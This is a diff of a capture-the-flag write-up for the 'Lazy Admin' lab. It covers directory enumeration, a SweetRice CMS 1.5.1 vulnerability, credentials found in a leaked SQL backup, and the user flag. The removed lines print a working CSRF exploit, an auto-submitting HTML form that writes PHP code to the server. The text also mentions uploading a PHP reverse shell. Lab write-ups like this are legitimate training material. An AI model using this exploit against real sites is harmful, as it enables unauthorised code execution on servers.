@@ -35,53 +35,7 @@ Examining the source code in web service running for some creds, found nothing. 
 Found out that "Basic-CMS Sweetrice" is running here, firing up gobuster again and adding */content* to the URI and here's the result: 
 ![/gobustercontent](/assets/images/writeups/thm/lazy_admin/gobuster_content.png "/gobuster_content")
 Did some research about this CMS and found that it the version 1.5.1 suffers from a code execution vulnerability via the use of a cross site request forgery flaw.
-- - - 
-<pre>
-<!--
-# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
-# Date: 30-11-2016
-# Exploit Author: Ashiyane Digital Security Team
-# Vendor Homepage: http://www.basic-cms.org/
-# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
-# Version: 1.5.1
-
-
-# Description :
-
-# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
-PHP Codes In Ads File
-# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
-PHP Codes On Server .
-# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo(); 
-Code You Can
-Customize Exploit For Your Self .
-
-# Exploit :
--->
-
-<html>
-<body onload="document.exploit.submit();">
-<form action="http://localhost/sweetrice/as/?type=ad&mode=save"
-method="POST" name="exploit">
-<input type="hidden" name="adk" value="hacked"/
-<textarea type="hidden" name="adv">
-<?php
-echo '<h1> Hacked </h1>';
-phpinfo();?>
-</textarea>
-</form>
-</body>
-</html>
-l
-<!--
-# After HTML File Executed You Can Access Page In
-http://localhost/sweetrice/inc/ads/hacked.php
-  -->
-
-</pre>
-
-- - -
-
+Check this link : [https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html](SweetRice-1.5.1-Code-Execution)
 So basically, this means that I can upload a php reverse shell and execute it but first we need credentials to login and then upload our file, so we need more enumeration.
 I examine the other subdirectories and there's a specific file that got my attention : */content/inc/mysql\_backup/mysql\_backup/mysql\_bakup\_20191129023059-1.5.1.sql* ! 
 Examining it carefully, I found a username and a password hash (*line 79*).
@@ -114,6 +68,9 @@ $ cat user.txt
 THM{#####################}
 </pre>
 - - -
+
+
+### <mark style='background-color:white'>root.txt</mark>
 Now we need to find a way to get the root flag !
 First of all, I ran *sudo -l* command : 
 - - -
